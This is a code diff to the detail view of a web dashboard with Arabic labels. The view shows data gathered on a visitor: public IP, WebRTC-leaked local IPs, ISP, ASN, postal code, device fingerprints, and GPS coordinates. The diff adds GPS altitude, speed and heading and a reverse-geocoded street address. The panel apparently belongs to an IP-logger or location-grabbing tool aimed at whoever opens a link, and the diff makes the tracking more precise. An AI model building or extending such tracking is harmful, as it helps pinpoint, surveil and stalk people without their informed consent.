@@ -307,14 +307,28 @@ function renderDetail(){
     \${ic("Public IP",geo.ip||s.serverIp||"N/A","vr")}
     \${ic("Server IP",s.serverIp,"vr")}
     \${ic("Local IPs (WebRTC)",(dev.localIPs||[]).join(", ")||"N/A","vr")}
-    \${ic("City",geo.city)} \${ic("Region",geo.region)} \${ic("Country",geo.country)}
-    \${ic("ISP",geo.org)} \${ic("Timezone",geo.timezone)}
+    \${ic("City",geo.city)} \${ic("Region",geo.region)}
+    \${ic("Country",(geo.countryName||geo.country))}
+    \${ic("Postal",geo.postal)}
+    \${ic("ISP",geo.isp||geo.org)}
+    \${ic("ASN",geo.asn)}
+    \${ic("Timezone",geo.timezone)}
+    \${ic("Source",geo.source)}
     \${geo.loc?'<div class="ic"><div class="lbl">خريطة IP</div><a class="map" href="https://maps.google.com/?q='+geo.loc+'" target="_blank">🗺 موقع تقريبي</a></div>':""}
   </div></div>
   <div class="sec"><div class="sec-title">GPS (دقيق)</div>
     \${gps.granted
       ?'<div class="grid">'+ic("Lat",gps.lat,"vg")+ic("Lon",gps.lon,"vg")+ic("Accuracy",gps.accuracy)
-        +'<div class="ic"><div class="lbl">خريطة GPS</div><a class="map" href="'+gps.mapsLink+'" target="_blank" style="color:#2ecc71">📍 موقع دقيق</a></div></div>'
+        +ic("Altitude",gps.altitude)+ic("Speed",gps.speed)+ic("Heading",gps.heading)
+        +'<div class="ic"><div class="lbl">Google Maps</div><a class="map" href="'+gps.mapsLink+'" target="_blank" style="color:#2ecc71">📍 فتح الموقع الدقيق</a></div>'
+        +(gps.address?'<div class="ic" style="grid-column:1/-1"><div class="lbl">العنوان</div><div class="val vg">'
+          +(gps.address.road?gps.address.road+', ':'')+
+          (gps.address.suburb?gps.address.suburb+', ':'')+
+          (gps.address.city||'')+
+          (gps.address.state?' — '+gps.address.state:'')+
+          (gps.address.country?' ('+gps.address.country+')':'')
+          +'</div></div>':"")
+        +'</div>'
       :'<div class="nodata">GPS '+(gps.granted===false?"رفض المستخدم الإذن":"لم يُطلب بعد")+'.</div>'}
   </div>
   <div class="sec"><div class="sec-title">Fingerprints</div><div class="grid">
